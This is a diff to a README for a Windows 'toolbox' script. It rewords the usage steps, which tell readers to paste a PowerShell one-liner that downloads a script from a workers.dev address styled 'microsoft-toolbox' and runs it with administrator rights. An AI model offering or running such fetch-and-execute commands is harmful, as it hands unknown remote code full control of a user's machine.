@@ -49,15 +49,14 @@ It's Completely Safe to use because everything is reversible
 
 
 # How to use
-Copy the following command and paste it in the startmenu search bar and hit enter <br />
-
 <img src="https://raw.githubusercontent.com/PsWinToolbox/Toolbox/main/how%20to%20run.png" alt="text" width="550"> <br />
 
 Easy Start Command <br />
-start powershell with admin right and paste the following link and enter. <br />
+Start powershell with admin right and paste the following link and enter. <br />
 ```iex((New-Object System.Net.WebClient).DownloadString('https://ps.microsoft-toolbox.workers.dev'))``` <br />
 
 Quick Start Command <br />
+Paste the Following command in the startmenu search bar and enter <br />
 ```powershell -c "Start-Process powershell \"iex((New-Object System.Net.WebClient).DownloadString('https://ps.microsoft-toolbox.workers.dev'))\" -Verb Runas"```
 
 <br />
